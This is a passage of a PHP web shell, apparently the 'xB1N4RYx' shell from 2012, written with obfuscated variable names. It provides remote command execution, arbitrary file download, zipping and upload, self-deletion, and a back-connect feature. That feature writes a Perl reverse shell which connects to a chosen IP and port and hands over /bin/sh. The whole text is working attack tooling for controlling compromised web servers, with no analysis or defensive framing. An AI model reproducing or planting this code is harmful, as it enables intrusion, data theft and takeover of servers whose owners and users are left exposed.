$sp51d7c4 = realpath($_SESSION['current_folder']) . '/'; $sp6236ec = binary_shell('cd ' . $sp51d7c4 . ' && ' . $sp1b2b3c); $sp53b705 = binary_shell('cd ' . $sp51d7c4 . ' && ' . './' . $sp1b2b3c); if (isset($sp6236ec)) { echo '<center>' . $sp6236ec . '</center>'; } else { echo '<center>' . $sp53b705 . '</center>'; } break; case 'downloadfile': $sp1b2b3c = $_GET['f']; $sp7ff75d = realpath($_SESSION['current_folder']) . '/' . $sp1b2b3c; if (file_exists($sp7ff75d)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=' . $sp1b2b3c); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); header('Content-Length: ' . filesize($sp7ff75d)); ob_clean(); flush(); readfile($sp7ff75d); die; } break; case 'downloadzip': $sp1b2b3c = $_GET['f']; $sp7ff75d = realpath($_SESSION['current_folder']) . '/' . $sp1b2b3c; $spf728ed = realpath('./' . $sp1b2b3c . '.zip'); compress($sp7ff75d, $sp1b2b3c . '.zip'); header('Content-Description: File Transfer'); header('Content-Type: application/zip'); header('Content-Disposition: attachment; filename=' . $sp1b2b3c . '.zip'); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); header('Content-Length: ' . filesize($spf728ed)); ob_clean(); flush(); readfile($spf728ed); die; break; case 'upload': echo '<form action="?page=dupload" method="post" enctype="multipart/form-data"><br>'; echo 'Select File:<br><br>'; echo '<input type="file" id="f" name="f"/>'; echo '<br><br>Upload to:<br><div id="login"><input type="text" id="to" name="to" style="width: 300px;" value="' . realpath($_SESSION['current_folder']) . '"/></div><br><div id="submit"><input type="submit" value="Upload"/></div>'; echo '</form>'; break; case 'dupload': $spd1dd9c = realpath($_POST['to']) . '/' . basename($_FILES['f']['name']); if (move_uploaded_file($_FILES['f']['tmp_name'], $spd1dd9c)) { echo 'Upload Successful!'; } else { echo 'Upload Unsuccessful! :('; } break; case 'sr': echo '<center>Do you really want to <a href="?page=selfremove"><font color="#990000">remove this shell</font></a>?</center>'; break; case 'selfremove': unlink($_SERVER['SCRIPT_FILENAME']); echo '<script>alert(\'Removed ' . $_SERVER['SCRIPT_FILENAME'] . '!\');'; echo 'location.href="?page=is_it_really_gone?";'; echo '</script>'; break; case 'viewimage': $sp412bbc = $_GET['i']; $sp6d4391 = realpath($_SESSION['current_folder']) . $spc9eee9 . $sp412bbc; header('Content-type: image/png'); ob_clean(); flush(); readfile($sp6d4391); break; case 'viewmovie': $sp412bbc = $_GET['i']; $sp6d4391 = realpath($_SESSION['current_folder']) . $spc9eee9 . $sp412bbc; header('Content-type: video/quicktime'); ob_clean(); flush(); readfile($sp6d4391); break; case 'bcon': echo '<div id="login" style="margin-top: 10px; margin-left: 10px;">'; echo '<form action="?page=bcon" method="get"><input type="hidden" name="page" value="bcon"/>'; echo 'IP:<br><input type="text" name="ip" value="' . getenv('remote_addr') . '" style="margin-top: 5px;"/><br><br>'; echo 'Port:<input type="submit" value="Connect" style="margin-left: 130px; margin-top: -4px;"/><br><input type="text" name="port" value="666" style="margin-top: 5px;"/>'; echo '</form>'; echo '</div>'; if (isset($_GET['ip']) && isset($_GET['port'])) { $spbfd0cf = $_GET['ip']; $sp83248d = $_GET['port']; $spfefc33 = fopen('/tmp/bxcon.pl', 'w'); fwrite($spfefc33, '#!/usr/bin/perl
use Socket;
$iaddr=inet_aton("' . $spbfd0cf . '") || die("Error: $!\\n");
$paddr=sockaddr_in("' . $sp83248d . '", $iaddr) || die("Error: $!\\n");
$proto=getprotobyname("tcp");
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\\n");
connect(SOCKET, $paddr) || die("Error: $!\\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);'); fclose($spfefc33); unlink('/tmp/bxcon.pl'); } break; } echo '[syslog]06
'; echo '</td>
</tr>
</table>
<br><center>xB1N4RYx ~ 2012</center><br>
</body>
</html>'; function rooting() { echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if ($_POST['_upl'] == 'Upload') { if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; } else { echo '<b>Basarisiz</b><br><br>'; } } } $sp41000b = $_GET['x']; switch ($sp41000b) { case 'rooting': rooting(); break; } echo '[syslog]07
';